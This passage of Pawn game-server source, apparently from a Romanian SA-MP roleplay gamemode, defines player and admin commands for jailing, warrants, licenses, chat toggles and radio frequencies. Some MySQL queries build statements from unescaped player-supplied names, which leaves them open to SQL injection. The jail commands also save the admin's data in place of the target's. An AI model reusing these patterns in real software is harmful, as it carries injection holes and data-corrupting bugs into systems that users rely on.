			if GetPlayerCash(playerid) < 500 *then 
				return SendClientMessage(playerid,COLOR_WHITE,"Nu ai bani destui.");
		
			GivePlayerCash(playerid, -500);
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
			BizzInfo[InInteriorID[playerid]][bBalance] += 500;
			CheckMission(playerid, 8);
		}		
		default: return SendClientMessage(playerid, COLOR_WHITE, "Barman: Nu avem aceasta bautura!");
	}

	new Float:health;
	GetPlayerHealthEx(playerid, health);
	SetPlayerHealthEx(playerid, health + 15.0);
	if health >= 100.0 *then SetPlayerHealthEx(playerid, 100.0);

	format(gString, 80, "* %s drinks %s.", GetName(playerid), drink);
	ProxDetector(30.0, playerid, gString, COLOR_PURPLE);			
    return true;
}
cmd:unjailo(playerid, params[]) {
	if !IsAdmin(playerid, 2) *then 
		return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);

	extract params -> new string:id[24]; else 
		return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/unjailo <name>");

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", id);
	mysql_tquery(SQL, gQuery, #check_acc_for_jail, #is, playerid, id);
	return true;
}

redist::check_acc_for_jail(playerid, const id[]) {
	if !cache_num_rows() *then
		return SendClientMessage(playerid, COLOR_GREY, "Acest cont nu a fost gasit in baza de date!");

	SCMf(playerid, COLOR_WHITE, "%s a fost scos din jail si a fost salvat in baza de date.", id);
	_query("UPDATE `users` SET `Jail` = '0' WHERE `name` = '%s'", id);
	return true;
}

cmd:jailo(playerid, params[]) {
	if !IsAdmin(playerid, 1) *then 
		return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);

	extract params -> new string:id[24], minutes, string:reason[32]; else 
		return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/ajailo <name> <Minute> <reason>");

	if FaceReclama(reason) *then
		return RemoveFunction(playerid, reason);

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", id);
	mysql_tquery(SQL, gQuery, #check_jail_Acc, #isis, playerid, id, minutes, reason);
	return true;
}
redist::check_jail_Acc(playerid, const id[], const minutes, const reason[32]) {
	if !cache_num_rows() *then
		return SendClientMessage(playerid, COLOR_GREY, "Acest cont nu exista in baza de date!");

	format(gString, 128, "Offline: %s a fost bagat in inchisoare de %s pentru %d minute, motiv: %s", id, GetName(playerid), minutes, reason);
	SCMTA(COLOR_LIGHTRED, gString);
	format(gString, 128, "Ai primit jail de la %s pentru %d minute, motiv %s.", GetName(playerid), minutes, reason);
	InsertEmail(id, PlayerInfo[playerid][pUsername], gString);		
	updateRaport(playerid);
	return true;
}

cmd:ajail(playerid, params[]) {
	if !IsAdmin(playerid, 1) *then 
		return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);

	extract params -> new player:id, minutes, string:reason[32]; else 
		return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/ajail <playerid/name> <Minutes> <reason>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	ResetWeapons(id);
	SetPlayerArmourEx(id, 0);
	for(new m = 0; m < 5; m++) SendDeathMessageToPlayer(id, 1001, 1001, 200);
	CheckPaintball(id);
	if(PaintType[id]) Iter_Remove(InPaint<PaintType[id]-1>, playerid);
	PaintType[id] = 0;
	PlayerInfo[id][pChatCMD] = 0;
	SetPlayerWantedLevel(id, 6);
	PlayerInfo[id][pWantedLevel] = 0;
	PlayerTextDrawHide(id, WantedTD);
	PlayerInfo[id][pJailed] = 2;
	PlayerInfo[id][pJailTime] = minutes*60;
	PlayerInfo[id][pAJail] = 1;
	InsereazaSanctiune(id, playerid, JAIL, reason);
	updateRaport(playerid);
	SpawnPlayer(id);
	_query("UPDATE `users` SET `WantedLevel` = '%i', `AJail` = '1', `Jailed` = '%i', `JailTime` = '%i', `Jails`=`Jails`+'1' WHERE `id` = '%i'", PlayerInfo[playerid][pWantedLevel], PlayerInfo[playerid][pJailed], PlayerInfo[playerid][pJailTime], PlayerInfo[playerid][pSQLID]);
	va_SendClientMessage(id, COLOR_LIGHTBLUE, "Esti in inchisoare pentru %d minute. motiv: %s", minutes,reason);
	sendSplittedMessageToPlayer(playerid, COLOR_WHITE, COLOR_WHITE, "AdmCmd: %s a fost bagat in inchisoare de %s pentru %d minute, motiv: %s", GetName(id), GetName(playerid),minutes,reason);
	return true;
}
cmd:unjail(playerid, params[]) {
	if !IsAdmin(playerid, 2) *then 
		return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);

	extract params -> new player:id; else 
		return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/unjail <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !PlayerInfo[id][pJailTime] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu este in jail!");
	
	ResetWeapons(id);
	PlayerInfo[id][pJailed] = 0;
	PlayerInfo[id][pJailTime] = 0;
	PlayerInfo[id][pWantedLevel] = 0;
	PlayerTextDrawHide(id, WantedTD);
	PlayerInfo[id][pAJail] = 0;				
	SpawnPlayer(id);
	_query("UPDATE `users` SET `Jailed`='%i', `JailTime` = '%i', `AJail` = '0', `WantedLevel` = '0' WHERE `id` = '%i'", PlayerInfo[playerid][pJailed], PlayerInfo[playerid][pJailTime], PlayerInfo[playerid][pSQLID]);
	format(gString, 128, "Admin %s l-a scos pe %s din inchisoare.", GetName(playerid), GetName(id));
	SendAdminMessage(COLOR_LOGS, gString,3);
	ClearCrime(id);
	TextDrawHideForPlayer(id, Jailtime[id]);
	return true;
}
cmd:aclear(playerid, params[]) {
	if !IsAdmin(playerid, 1) *then 
		return true;

	extract params -> new player:id; else 
		return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/aclear <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Player not logged!");

	if !PlayerInfo[id][pWantedLevel] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu are wanted!");

	SCMf(id, COLOR_LIGHTRED, "Admin %s has cleared all your warrants!", GetName(playerid));
	SendTeamMessage(1, COLOR_LIGHTBLUE, "Dispatch: Admin %s has cleared all the warrants on %s.", GetName(playerid), GetName(id));
	PlayerInfo[id][pWantedLevel] = 0;
	UpdateVar(id, "WantedLevel", 0);
	PlayerTextDrawHide(id, WantedTD);
	SetPlayerWantedLevel(id, 0);
	ClearCrime(id);
	return true;
}
cmd:clear(playerid, params[]) {
	if(!IsACop(playerid)) return SendErrorMsg(playerid, "Nu faci parte din factiunea politiei.");
	extract params -> new player:id, string:reason[32]; else return SendUsageMsg(playerid, "clear [id] [reason]");
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!PlayerInfo[id][pWantedLevel]) return SendErrorMsg(playerid, "Acel player nu are wanted!");


	va_SendClientMessage(id, COLOR_LIGHTRED, "%s has cleared all your warrants. Reason: %s", GetName(playerid), reason);
	SendTeamMessage(1, COLOR_LIGHTBLUE, "Dispatch: %s has cleared all the warrants on %s. Reason: %s", GetName(playerid), GetName(id), reason);
	PlayerInfo[id][pWantedLevel] = 0;
	PlayerTextDrawHide(id, WantedTD);
	SetPlayerWantedLevel(id, 0);
	ClearCrime(id);
	return true;
}
cmd:showlicenses(playerid, params[]) {
	extract params -> new player:id; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/showlicenses <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !ProxDetectorS(8.0, playerid, id) *then 
		return SendClientMessage(playerid,COLOR_WHITE, "Acel player nu este langa tine.");

	if Spectate[id] != -1 *then
		return SendClientMessage(playerid,COLOR_WHITE, "Acel player nu este langa tine.");

	SCMf(playerid, COLOR_LIGHTBLUE, "I-ai aratat licentele lui %s.", GetName(id));
	SCMf(id, COLOR_LIGHTBLUE, "%s ti-a aratat licentele lui.", GetName(playerid));
	ShowLicenses(id, playerid);
    return true;
}

cmd:shards(playerid, params[]) {
	SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Sistem dezactivat temporar!");
	//format(gString, 128, "Monster Shard Part - {FDC85F}%d/4\nTractor Shard Part - {FDC85F}%d/4\nMonster Premium Shard Part - {FDC85F}%d/4", PlayerInfo[playerid][pShard][0], PlayerInfo[playerid][pShard][1], PlayerInfo[playerid][pShard][2]);
	//ShowPlayerDialog(playerid, DIALOG_SHARD, DIALOG_STYLE_LIST, "Shards", gString, "Select", "Cancel");
	return true;
}

cmd:alicenses(playerid, params[]) {
	if !IsAdmin(playerid, 1) *then 
		return SendClientMessage(playerid,COLOR_WHITE,AdminOnly);
	
	extract params -> new player:id; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/alicenses <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Player not logged.");

	ShowLicenses(playerid, id);
    return true;
}
cmd:tog(playerid, params[]) {
	new szDialog[1024];
	strcat(szDialog, "Functie\tStatus\n");
	strcat(szDialog, toglc[playerid] != 1 ? "Leader chat\t{128C14}Enabled\n" : "Leader chat\t{D60F0F}Disabled\n");
	strcat(szDialog, gFam[playerid] != 1 ? "Faction chat\t{128C14}Enabled\n" : "Faction chat\t{D60F0F}Disabled\n");
	strcat(szDialog, WTToggle[playerid] != 1 ? "Freq chat\t{128C14}Enabled\n" : "Freq chat\t{D60F0F}Disabled\n");
	strcat(szDialog, HidePM[playerid] != 1 ? "Whisper\t{128C14}Enabled\n" : "Whisper\t{D60F0F}Disabled\n");
	strcat(szDialog, gOoc[playerid] != 1 ? "OOC\t{128C14}Enabled\n" : "OOC\t{D60F0F}Disabled\n");
	strcat(szDialog, gNews[playerid] != 1 ? "Ad & News\t{128C14}Enabled\n" : "Ad & News\t{D60F0F}Disabled\n");
	strcat(szDialog, toglicitatie[playerid] != 0 ? "Auction\t{128C14}Enabled\n" : "Auction\t{D60F0F}Disabled\n");
	strcat(szDialog, togclan[playerid] != 1 ? "Clan chat\t{128C14}Enabled\n" : "Clan chat\t{D60F0F}Disabled\n");
	strcat(szDialog, togevent[playerid] != 1 ? "Event chat\t{128C14}Enabled\n" : "Event chat\t{D60F0F}Disabled\n");
	strcat(szDialog, togding[playerid] != 1 ? "DMG Song (ding)\t{128C14}Enabled\n" : "DMG Song (ding)\t{D60F0F}Disabled\n");
	strcat(szDialog, togfind[playerid] != 1 ? "Find\t{128C14}Enabled\n" : "Find\t{D60F0F}Disabled\n");
	strcat(szDialog, tograport[playerid] != 1 ? "Raport\t{128C14}Enabled\n" : "Raport\t{D60F0F}Disabled\n");
	strcat(szDialog, togjob[playerid] != 1 ? "Job\t{128C14}Enabled\n" : "Job\t{D60F0F}Disabled\n");	
	strcat(szDialog, togTransfer[playerid] != 1 ? "Transfer & Pay\t{128C14}Enabled\n" : "Transfer & Pay\t{D60F0F}Disabled\n");	
	strcat(szDialog, togFriend[playerid] != 1 ? "Friend Invite\t{128C14}Enabled\n" : "Friend Invite\t{D60F0F}Disabled\n");	
	strcat(szDialog, PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pPremiumAccount] == 1 ? togpremium[playerid] != 1 ? "Tog Premium Chat\t{128C14}Enabled\n" : "Tog Premium Chat\t{D60F0F}Disabled\n" : "Tog Premium Chat\t{D60F0F}Disabled\n");
	strcat(szDialog, togLancher[playerid] ? "Tog Launch Control\t{128C14}Enabled\n" : "Tog Launch Control\t{D60F0F}Disabled\n");	
	strcat(szDialog, togStage[playerid] ? "Tog Stage\t{128C14}Enabled\n" : "Tog Stage\t{D60F0F}Disabled\n");	
	strcat(szDialog, togJobGoal[playerid] ? "Tog Job Goal\t{128C14}Enabled\n" : "Tog Job Goal\t{D60F0F}Disabled\n");	
	strcat(szDialog, togsurf[playerid] ? "Tog Surf\t{128C14}Enabled\n" : "Tog Surf\t{D60F0F}Disabled\n");
	strcat(szDialog, !togLegend[playerid] ? "Tog Legend Chat\t{128C14}Enabled\n" : "Tog Legend Chat\t{D60F0F}Disabled\n");	
	strcat(szDialog, togCrate[playerid] ? "Tog Crate\t{128C14}Enabled\n" : "Tog Crate\t{D60F0F}Disabled\n");	
	strcat(szDialog, PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pVip] == 1 ? togvip[playerid] != 1 ? "VIP Chat\t{128C14}Enabled\n" : "VIP Chat\t{D60F0F}Disabled\n" : "VIP Chat\t{D60F0F}Disabled\n");
	strcat(szDialog, togHeadText[playerid] ? "Player Head Text\t{128C14}Enabled\n" : "Player Head Text\t{D60F0F}Disabled\n");	
	strcat(szDialog, togReborn[playerid] ? "Reborn Chat\t{128C14}Enabled\n" : "Reborn Chat\t{D60F0F}Disabled\n");
	ShowPlayerDialog(playerid, DIALOG_TOG, DIALOG_STYLE_TABLIST_HEADERS, "Tog", szDialog, "Select", "Close");
	return true;
}
cmd:togn(playerid, params[]) {
	switch(NewbieChat[playerid]) {
		case false: {
			NewbieChat[playerid]=true;
			SendClientMessage(playerid, COLOR_LGREEN, "Chat [/n] activat!");
		}
		case true: {
			if(PlayerInfo[playerid][pHelper] >= 1) return SendClientMessage(playerid, COLOR_GREY, "Nu poti dezactiva deoarece esti helper.");
			if(Iter_Contains(newbie_players, playerid) || HaveHelper[playerid]!=-1) return SendClientMessage(playerid, COLOR_GREY, "Nu poti dezactiva acest chat cat timp ai pusa o intrebare!");
			NewbieChat[playerid]=false;
			SendClientMessage(playerid, COLOR_LGREEN, "Chat [/n] dezactivat!");
		}
	}
	UpdateVar(playerid, "NewbieChat", NewbieChat[playerid]);
	return true;
}
cmd:licenses(playerid, params[]) return ShowLicenses(playerid, playerid);
cmd:startlesson(playerid, params[]) {
	new id,string[180];
	if(PlayerInfo[playerid][pMember] != 7 && PlayerInfo[playerid][pMember] != 16 && PlayerInfo[playerid][pMember] != 21) return true;
	if(sscanf(params, "u",id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/startlesson <playerid/name>");
	if(InLesson[playerid] != -1 || InLesson[id] != -1) return SendClientMessage(playerid, -1, "Tu sau acel player va aflati deja intr-o lectie.");
	if(id == playerid) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");
	if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");
	if(PlayerInfo[id][pLevel] < 3) return SendClientMessage(playerid, -1, "Nu poti da aceasta licenta unui player ce are nivel mai mic de 3.");
	if(!ProxDetectorS(9.0, playerid, id)) return SendClientMessage(playerid, -1, "Nu esti langa acel jucator!");
	format(string, sizeof(string), "Instructorul %s doreste sa inceapa o lectie cu tine. (/accept lesson %d)", GetName(playerid), playerid);
	SendClientMessage(id, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), "Invitatie a fost trimisa lui %s.", GetName(id));
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);	
	Lesson[id] = playerid;
	return true;
}
cmd:stoplesson(playerid, params[]) {
	if(InLesson[playerid] == -1) return SendClientMessage(playerid, -1, "Nu esti intr-o lectie.");
	if(!IsPlayerConnected(InLesson[playerid])) return true;
	SendClientMessage(InLesson[playerid], COLOR_LIGHTBLUE, "Lectia a fost terminata!");
	SendClientMessage(playerid, COLOR_LIGHTBLUE, "Lectia a fost terminata!");
	InLesson[playerid] = InLesson[InLesson[playerid]] = -1;
	return true;
}
cmd:insertcar(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai acces la aceasta comanda.");
	new model, price, dsstock;
	if(sscanf(params, "iii", model, price, dsstock)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/insertcar <model> <price> <stock>");
	if(model < 400 || model > 611) return SendClientMessage(playerid,COLOR_WHITE, "Invalid car ID.");
	if(price < 1 || price > 2000000000) return SendClientMessage(playerid, COLOR_LGREEN, "Invalid price.");
	gQuery[0] = EOS;
	mysql_format(SQL, gQuery, sizeof(gQuery), "INSERT INTO dsveh (`Model`, `Price`, `Stock`) VALUES ('%d', '%d', '%d')", model, price, dsstock);
	mysql_tquery(SQL, gQuery, "InsertCars", "iiii", playerid, model, price, dsstock);
	return true;
}
redist::InsertCars(playerid, model, price, dsstock) {
	new i = cache_insert_id();
	DSModels[i][dID] = i;
	DSModels[i][dModel] = model;
	DSModels[i][dPrice] = price;
	DSModels[i][dStock] = dsstock;	
	dsvehs ++;
	gString[0] = EOS;
	format(gString, 128, "(/insertcar) {FFFFFF}AdmCmd: Admin %s a insearat un vehicul in dealership %s, price %s.", GetName(playerid), aVehicleNames[model-400], FormatNumber(price));
	SendAdminMessage(COLOR_LGREEN, gString, 6);
	return true;
}
cmd:instructors(playerid, params[]) {
	SendClientMessage(playerid, -1, "---- Instructori online ----");
	if(!Iter_Count(faction_players<7>)) return SendClientMessage(playerid, -1, "Nu sunt instructori online.");
	foreach(new i : faction_players<7>) SCMf(playerid, COLOR_WHITE, "%s{FFFFFF} %s (%d) - phone number: %s.", AFKSeconds[i]<120?("{9aff52}[active]"):("{ffc852}[AFK]"), GetName(i), i, PlayerInfo[i][pPhone]);
	SCMf(playerid, COLOR_LGREEN, "Instructori online: %d", Iter_Count(faction_players<7>));
	return true;
}
cmd:mechanics(playerid, params[]) {
	SendClientMessage(playerid, -1, "---- Mecanici online ----");
	if(!Iter_Count(faction_players<8>)) return SendClientMessage(playerid, -1, "Nu sunt mechanici online.");
	foreach(new i : faction_players<8>) SCMf(playerid, COLOR_WHITE, "%s{FFFFFF} %s (%d) - phone number: %s.", AFKSeconds[i]<120?("{9aff52}[active]"):("{ffc852}[AFK]"), GetName(i), i, PlayerInfo[i][pPhone]);
	SCMf(playerid, COLOR_LGREEN, "Mecanici online: %d", Iter_Count(faction_players<8>));
	return true;
}
cmd:givelicense(playerid, params[]) {
	if !IsAdmin(playerid, 7) && PlayerInfo[playerid][pMember] != 16 && PlayerInfo[playerid][pMember] != 21 *then 
		return true;

	extract params -> new player:id, string:lic[20]; else {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/givelicense <playerid/name> <License>");
		SendClientMessage(playerid, COLOR_WHITE, "Valabile: Fly, Sailing, Gun.");
		return true;
	}
	if InLesson[id] != playerid *then 
		return SendClientMessage(playerid, -1, "Acel player nu este intr-o lectie cu tine.");
	
	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if PlayerInfo[id][pLevel] < 3 *then 
		return SendClientMessage(playerid, -1, "Nu poti da aceasta licenta unui player ce are nivel mai mic de 3.");

	if !ProxDetectorS(9.0, playerid, id) *then 
		return SendClientMessage(playerid, -1, "Nu esti langa acel jucator!");
	
	switch YHash(lic) do {
		case _H<fly>: {
			if GetPlayerCash(playerid) < 300000 *then 
				return SendClientMessage(playerid, -1, "Acel jucator nu are suma necesara de bani!");

			if PlayerInfo[id][pFlyLicS] != 0 *then 
				return SendClientMessage(playerid, -1, "Acel jucator are aceasta licenta suspendata!");

			if PlayerInfo[id][pFlyLicT] > gettime() *then 
				return SendClientMessage(playerid, -1, "Acel jucator are deja aceasta licenta!");

			SCMf(playerid, COLOR_LIGHTBLUE,  "* I-ai oferit licenta de zbor lui %s pentru suma de $%s.",GetName(id), FormatNumber(300000));
			SCMf(id, COLOR_LIGHTBLUE, "* Instructorul %s ti-a oferit licenta de zbor in schimbul sumei de $%s. (/accept license %d)",GetName(playerid), FormatNumber(300000), playerid);
			finishAchievement(id, 8);
			License[id] = 1;
			LicenseOffer[id] = playerid;
		}
		case _H<sailing>: {
			if GetPlayerCash(playerid) < 400000 *then 
				return SendClientMessage(playerid, -1, "Acel jucator nu are suma necesara de bani!");

			if PlayerInfo[id][pBoatLicS] != 0 *then 
				return SendClientMessage(playerid, -1, "Acel jucator are aceasta licenta suspendata!");
			
			if PlayerInfo[id][pBoatLicT]>gettime() *then 
				return SendClientMessage(playerid, -1, "Acel jucator are deja aceasta licenta!");
		
			SCMf(playerid, COLOR_LIGHTBLUE, "* I-ai oferit licenta de navigatie lui %s pentru suma de $%s.",GetName(id), FormatNumber(400000));
			SCMf(id, COLOR_LIGHTBLUE, "* Instructorul %s ti-a oferit licenta de navigatie in schimbul sumei de $%s. (/accept license %d)",GetName(playerid), FormatNumber(400000), playerid);
			finishAchievement(id, 9);
			License[id] = 2;
			LicenseOffer[id] = playerid;
		}
		case _H<gun>: {
			if GetPlayerCash(playerid) < 500000 *then 
				return SendClientMessage(playerid, -1, "Acel jucator nu are suma necesara de bani!");
			
			if PlayerInfo[id][pGunLicS] != 0 *then 
				return SendClientMessage(playerid, -1, "Acel jucator are aceasta licenta suspendata!");

			if PlayerInfo[id][pGunLicT]>gettime() *then 
				return SendClientMessage(playerid, -1, "Acel jucator are deja aceasta licenta!");

			SCMf(playerid, COLOR_LIGHTBLUE, "* I-ai oferit licenta de arme lui %s pentru suma de $%s.", GetName(id), FormatNumber(500000));
			SCMf(id, COLOR_LIGHTBLUE, "* Instructorul %s ti-a oferit licenta arme in schimbul sumei de $%s. (/accept license %d)", GetName(playerid), FormatNumber(500000), playerid);
			finishAchievement(id, 7);
			License[id] = 3;
			LicenseOffer[id] = playerid;
		}
		default: return SendClientMessage(playerid, COLOR_GREY, "Invalid license.");
	}
	CheckMission(playerid, 9);
    return true;
}

stock ShowLicenses(playerid, targetid) {
	gString[0] = (EOS);
	SCMf(playerid, -1, "---- %s's licenses ----", GetName(targetid));
	if(PlayerInfo[targetid][pCarLicS]) SCMf(playerid, -1, "Driving licence: Suspended (%d hours).", PlayerInfo[targetid][pCarLicS]); 
	else if(PlayerInfo[targetid][pCarLicT] > 0) SCMf(playerid, COLOR_WHITE, "Driving licence: Passed (%d hours)",  PlayerInfo[targetid][pCarLicT]);
	else SendClientMessage(playerid, COLOR_WHITE, "Driving licence: Not Passed");

	if(PlayerInfo[targetid][pFlyLicS]) SCMf(playerid, -1, "Flying licence: Suspended (%d hours).", PlayerInfo[targetid][pFlyLicS]); 
	else if(PlayerInfo[targetid][pFlyLicT] > 0) SCMf(playerid, -1, "Flying licence: Passed (%d hours)",  PlayerInfo[targetid][pFlyLicT]);
	else SendClientMessage(playerid, -1, "Flying licence: Not Passed");

	if(PlayerInfo[targetid][pBoatLicS]) SCMf(playerid, -1, "Boat licence: Suspended (%d hours).", PlayerInfo[targetid][pBoatLicS]); 
	else if(PlayerInfo[targetid][pBoatLicT] > 0) SCMf(playerid, -1, "Boat licence: Passed (%d hours)",  PlayerInfo[targetid][pBoatLicT]);
	else SendClientMessage(playerid, -1, "Boat licence: Not Passed");

	if(PlayerInfo[targetid][pGunLicS]) SCMf(playerid, -1, "Weapon licence: Suspended (%d hours).", PlayerInfo[targetid][pGunLicS]); 
	else if(PlayerInfo[targetid][pGunLicT] > 0) SCMf(playerid, -1, "Weapon licence: Passed (%d hours)",  PlayerInfo[targetid][pGunLicT]);
	else SendClientMessage(playerid, -1, "Weapon licence: Not Passed");
	SendClientMessage(playerid, -1, "------------");
	return true;
}
cmd:setint(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);
	new id,intid,string[180];
	if(sscanf(params, "ud", id,intid)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/setint <playerid/name> <Interior ID>");
	if(!IsPlayerConnected(id) || !IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");
	SetPlayerInterior(id,intid);
	format(string, sizeof(string), "I-ai setat lui {7BAABA}%s(%d){FFFFFF} interior %d.", GetName(id), id, intid);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "Admin {7BAABA}%s{FFFFFF} ti-a setat interior %d.", GetName(playerid), intid);
	SendClientMessage(id, COLOR_WHITE, string);
	return true;
}
cmd:setvw(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);
	new id,vwid,string[180];
	if(sscanf(params, "ud", id,vwid)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/setvw <playerid/name> <Virtual World>");
	if(!IsPlayerConnected(id) || !IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");
	SetPlayerVirtualWorld(id,vwid);
	format(string, sizeof(string), "I-ai setat lui {7BAABA}%s(%d){FFFFFF} virtual world %d.", GetName(id), id, vwid);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "Admin {7BAABA}%s{FFFFFF} ti-a setat virtual world %d.", GetName(playerid), vwid);
	SendClientMessage(id, COLOR_WHITE, string);
	return true;
}

cmd:showfreq(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid,COLOR_WHITE,AdminOnly);
	new id,string[64];
    if(sscanf(params, "u",id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/showfreq <playerid/name>");
    if(PlayerInfo[id][pWTalkie] == 0) return SendClientMessage(playerid, 0xFFFFFFFF, "Acel player nu are Walkie Talkie.");
   	format(string, sizeof(string), "Frecventa %d.",WTChannel[id-1]);
    SendClientMessage(playerid, COLOR_WHITE, string);
    return true;
}
cmd:setfreq(playerid, params[]) {	
	if(PlayerInfo[playerid][pWTalkie] == 0) 
		return SendClientMessage(playerid, 0xFFFFFFFF, "Nu ai o frecventa radio.");
	
	new freqss2;
    if(sscanf(params, "i",freqss2)) 
    	return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/setfreq <Frecventa>");

    if(freqss2 < 0 || freqss2 > 100 ) 
    	return SendClientMessage(playerid, COLOR_GREY, "Frecvente disponibile: 1-100.");
	
	if(WTToggle[playerid] == 1) 
		return SendClientMessage(playerid, 0xFFFFFFFF, "Statia ta este oprita. Foloseste comanda /tog pentru a o activa.");
	
	if(freqss2 == WTChannel[playerid]) 
		return SendClientMessage(playerid, COLOR_GREY, "Esti deja in aceasta frecventa.");

	if(WTChannel[playerid]) Iter_Remove(freq_members<WTChannel[playerid]>, playerid);
	WTChannel[playerid] = freqss2;
	mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `WTChannel`='%d' WHERE `ID`='%d'", WTChannel[playerid], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery);	
	if(freqss2 == 0) {
		SendClientMessage(playerid, COLOR_YELLOW, "Ai inchis frecventa!");
		return true;
	}		
	Iter_Add(freq_members<WTChannel[playerid]>, playerid);
    SCMf(playerid, COLOR_LIGHTBLUE, "Ai intrat pe frecventa %d.",freqss2);
	return true;
}
cmd:wt(playerid, params[]) {
	if(DeelayCommand[playerid][8]>gettime()) 
		return DeelayTime(playerid, 8);

	if(PlayerInfo[playerid][pWTalkie] == 0) 
		return SendClientMessage(playerid, 0xFFFFFFFF, "Nu ai o frecventa radio.");

    if(PlayerInfo[playerid][pMuted] == 1)
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);

	if(sscanf(params, "s[128]", params)) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/wt <text>");
	
	if(WTToggle[playerid] == 1) 
		return SendClientMessage(playerid, 0xFFFFFFFF, "Statia ta este oprita. Foloseste comanda /tog pentru a o activa.");

	if(WTChannel[playerid] == 0) 
		return SendClientMessage(playerid,COLOR_GREY, "Nu esti pe o frecventa!");

	DeelayCommand[playerid][8] = gettime()+5;
	format(gString, 180, "[FREQ %d] %s%s: %s",WTChannel[playerid], Iter_Contains(Staff<ADMIN>, playerid) ? ("Admin "):(""), GetName(playerid), params);
	foreach(new i : freq_members<WTChannel[playerid]>) {
		if(WTToggle[i]) continue;
		SendClientMessage(i, 0xC8E0DFFF, gString);
	}
	return true;
}
cmd:freqmembers(playerid, params[]) {
	if(PlayerInfo[playerid][pWTalkie] == 0) 
		return SendClientMessage(playerid, 0xFFFFFFFF, "Nu ai o frecventa radio.");

	if(WTChannel[playerid] == 0) 
		return SendClientMessage(playerid,COLOR_GREY, "Nu esti pe o frecventa!");

	SCMf(playerid, -1, "-- Playeri pe frecventa %d --", WTChannel[playerid]);
	foreach(new i : freq_members<WTChannel[playerid]>) SCMf(playerid, -1, "%s (%d)", GetName(i), i);
	if(!Iter_Count(freq_members<WTChannel[playerid]>)) return SendClientMessage(playerid, -1, "Nu au fost gasiti jucatori pe aceasta frecventa!");
	SCMf(playerid, COLOR_LGREEN, "* Au fost gasiti %d jucatori pe aceasta frecventa!", Iter_Count(freq_members<WTChannel[playerid]>));
	return true;
}

cmd:requestnumber(playerid, params[]) {
	if(DeelayCommand[playerid][34] > gettime())
		return DeelayTime(playerid, 34);

	if(PlayerInfo[playerid][pVip] != 3)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai cont legend!");

	extract params -> new string:number[32]; else 
		return SendClientMessage(playerid, COLOR_LGREEN, "SYNTAX: {FFFFFF}/requestnumber <custom number>");

	if(IsNumeric(number)) return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti pune numar doar din cifre.");

	if(strcmp(PlayerInfo[playerid][pPhone],"In Process",true) == 0) {
